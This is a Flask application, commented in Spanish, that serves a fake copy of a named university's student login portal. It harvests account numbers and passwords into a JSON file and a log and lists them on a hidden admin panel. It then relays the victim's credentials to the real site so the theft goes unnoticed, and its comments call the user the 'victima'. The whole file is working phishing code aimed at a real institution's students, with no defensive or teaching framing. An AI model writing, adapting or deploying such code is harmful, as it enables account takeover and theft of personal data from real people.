import os
import json
import logging
import threading
from datetime import datetime
from flask import Flask, request, render_template, redirect, flash

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY") or os.urandom(24)

# --- Configuracion del portal real -------------------------------------------
# action y method copiados del formulario real (Default.php).
DESTINO_REAL = "https://siia.uasnet.mx/alumnos/home.php"
METODO_REAL = "post"
# El boton real es <button type="submit" name="Entrada"> SIN atributo value,
# asi que el navegador envia "Entrada=" vacio. isset($_POST['Entrada']) da true igual.
VALOR_BOTON = ""
# El formulario real no tiene campos ocultos ni token CSRF. Si algun dia los
# agrega, metelos aqui y apareceran en el puente.
CAMPOS_EXTRA = {}

# --- Configuracion del despliegue --------------------------------------------
PUERTO = int(os.environ.get("PORT", 5000))
RUTA_PANEL = os.environ.get("RUTA_PANEL", "panel")
ARCHIVO = "capturas.json"

_lock = threading.Lock()

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler("capturas.log", encoding="utf-8"),
        logging.StreamHandler(),
    ],
)


def cargar():
    try:
        with open(ARCHIVO, encoding="utf-8") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return []


def guardar(datos):
    with open(ARCHIVO, "w", encoding="utf-8") as f:
        json.dump(datos, f, ensure_ascii=False, indent=2)


@app.route("/")
def login():
    return render_template("login.html")


@app.route("/login", methods=["POST"])
def capturar():
    cuenta = (request.form.get("txtCuenta") or "").strip()[:20]
    # txtNip es type=password en el portal: acepta letras, no solo digitos.
    nip = (request.form.get("txtNip") or "").strip()[:20]

    if not cuenta or not nip:
        flash("Cuenta o NIP invalidos")
        return redirect("/")

    datos = {
        "cuenta": cuenta,
        "nip": nip,
        "ip": request.headers.get("X-Forwarded-For", request.remote_addr),
        "ua": request.headers.get("User-Agent", "")[:200],
        "fecha": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }

    with _lock:
        capturas = cargar()
        capturas.append(datos)
        guardar(capturas)

    logging.info("CAPTURA cuenta=%s nip=%s ip=%s", cuenta, nip, datos["ip"])

    # El navegador de la victima hace el POST real. La cookie de sesion queda
    # en el dominio siia.uasnet.mx y aterriza logueada en home.php.
    return render_template(
        "puente.html",
        destino=DESTINO_REAL,
        metodo=METODO_REAL,
        cuenta=cuenta,
        nip=nip,
        boton=VALOR_BOTON,
        extra=CAMPOS_EXTRA,
    )


@app.route("/" + RUTA_PANEL)
def panel():
    with _lock:
        capturas = cargar()
    return render_template("panel.html", credenciales=list(reversed(capturas)))


if __name__ == "__main__":
    logging.info("Falsa: / | Panel: /%s | Puente: %s", RUTA_PANEL, DESTINO_REAL)
    app.run(host="0.0.0.0", port=PUERTO, debug=False)